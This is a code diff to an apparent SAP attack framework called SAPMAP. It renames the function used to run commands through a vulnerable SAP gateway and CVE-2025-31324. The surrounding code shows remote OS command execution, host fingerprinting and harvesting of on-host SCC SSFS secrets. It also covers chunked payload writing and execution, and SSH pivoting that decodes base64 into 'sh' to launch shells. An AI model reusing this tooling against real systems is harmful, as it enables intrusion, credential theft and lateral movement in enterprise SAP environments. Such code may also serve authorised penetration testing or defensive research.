@@ -880,7 +880,7 @@ def _detect_is_windows(node, method: str = "sxpg") -> bool:
     probe_token = "__SAPMAP_WIN__"
     try:
         if method == "gateway" and node.gw_vulnerable:
-            r = sapmap_exploit.execute_gw_command(
+            r = sapmap_exploit.execute_os_command(
                 node, "cmd.exe", f"/C echo {probe_token}")
         elif method == "cve_31324" and node.cve_2025_31324_vulnerable:
             # Route through the dropped JSP if available (output capture),
@@ -920,7 +920,7 @@ def _detect_python_cmd(node) -> str:
     for cmd in ("python3", "python"):
         try:
             if node.gw_vulnerable:
-                result = sapmap_exploit.execute_gw_command(
+                result = sapmap_exploit.execute_os_command(
                     node, cmd, "--version")
             else:
                 creds = node.best_credentials()
@@ -2469,7 +2469,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 # With long_params=None (run_os_command default), the kernel
                 # concatenates PARAMS+LONG_PARAMS, turning "cat /path" into
                 # "cat /path /path" and returning the file content twice.
-                from sapmap_exploit import execute_gw_command
+                from sapmap_exploit import execute_os_command as execute_gw_command
                 is_win = "windows" in (n.os_type or "").lower() or \
                          "nt" in (n.os_type or "").lower()
                 def _gw(prog, arg):
@@ -3384,7 +3384,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
             _task_start(f"{sid}:harvest_scc_ssfs",
                         f"{sid}: Reading on-host SCC SSFS via OS-exec")
             try:
-                from sapmap_exploit import execute_gw_command
+                from sapmap_exploit import execute_os_command as execute_gw_command
                 import base64 as _b64
 
                 is_win = "windows" in (node.os_type or "").lower() or \
@@ -7662,14 +7662,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     # with "windows" in output → Windows. If it fails,
                     # try "uname" which works on Linux/Unix.
                     try:
-                        probe = sapmap_exploit.execute_gw_command(
+                        probe = sapmap_exploit.execute_os_command(
                             node, "cmd.exe /C ver", "")
                         if probe.get("success") and probe.get("output"):
                             out_text = " ".join(probe["output"]).lower()
                             if "windows" in out_text:
                                 os_type = "Windows NT"
                         if not os_type:
-                            probe2 = sapmap_exploit.execute_gw_command(
+                            probe2 = sapmap_exploit.execute_os_command(
                                 node, "uname", "")
                             if probe2.get("success") and probe2.get("output"):
                                 os_type = "Linux"
@@ -7699,7 +7699,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
         if method == "gateway":
             if not node.gw_vulnerable:
                 return json.dumps({"error": "Gateway not vulnerable on this system"})
-            result = sapmap_exploit.execute_gw_command(node, command, params)
+            result = sapmap_exploit.execute_os_command(node, command, params)
         elif method == "sxpg":
             creds = node.best_credentials()
             if not creds:
@@ -7796,7 +7796,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
             print(f"[*] {sid}: OS terminal via SSH from "
                   f"{acc['from_sid']} → {acc['username']}@"
                   f"{acc['target']} (cmd: {full[:80]!r})")
-            ssh_result = sapmap_exploit.execute_gw_command(
+            ssh_result = sapmap_exploit.execute_os_command(
                 src_node, "ssh", ssh_args, long_params="")
             result = {
                 "success": bool(ssh_result.get("success")),
@@ -7904,11 +7904,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             return
                         _set_progress(
                             f"Writing payload chunk {idx+1}/{total}...")
-                        sapmap_exploit.execute_gw_command(
+                        sapmap_exploit.execute_os_command(
                             node, step["command"], step["params"],
                             long_params=step.get("long_params"))
                 _set_progress("Executing payload...")
-                result = sapmap_exploit.execute_gw_command(
+                result = sapmap_exploit.execute_os_command(
                     node, payload["command"], payload["params"],
                     long_params=payload.get("long_params"))
             elif method == "cve_31324":
@@ -8245,7 +8245,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     _set_progress("Launching shell via SSH...")
                     print(f"[*] {sid}: SSH one-shot ({len(one_shot)} "
                           f"bytes)")
-                    result = sapmap_exploit.execute_gw_command(
+                    result = sapmap_exploit.execute_os_command(
                         src_node, "ssh", one_shot, long_params="")
                     result["success"] = True
                 else:
@@ -8282,7 +8282,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                   "wrapper)...")
 
                     # Clean
-                    sapmap_exploit.execute_gw_command(
+                    sapmap_exploit.execute_os_command(
                         src_node, "ssh",
                         f"{ssh_prefix} rm -f /tmp/.sp",
                         long_params="")
@@ -8301,7 +8301,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         w_args = (
                             f"{ssh_prefix} "
                             f"echo {inner_b64}|base64 -d|sh")
-                        r = sapmap_exploit.execute_gw_command(
+                        r = sapmap_exploit.execute_os_command(
                             src_node, "ssh", w_args, long_params="")
                         print(f"    chunk {idx+1}/{total}: "
                               f"ok={r.get('success')} "
@@ -8312,7 +8312,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     vfy_cmd = "wc -c</tmp/.sp"
                     vfy_b64 = _b64ssh.b64encode(
                         vfy_cmd.encode()).decode()
-                    vfy = sapmap_exploit.execute_gw_command(
+                    vfy = sapmap_exploit.execute_os_command(
                         src_node, "ssh",
                         f"{ssh_prefix} echo {vfy_b64}|base64 -d|sh",
                         long_params="")
@@ -8335,7 +8335,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"echo {exec_b64}|base64 -d|sh")
                     print(f"[*] {sid}: SSH exec ({len(exec_args)} "
                           f"bytes)")
-                    result = sapmap_exploit.execute_gw_command(
+                    result = sapmap_exploit.execute_os_command(
                         src_node, "ssh", exec_args, long_params="")
                     result["success"] = True
 
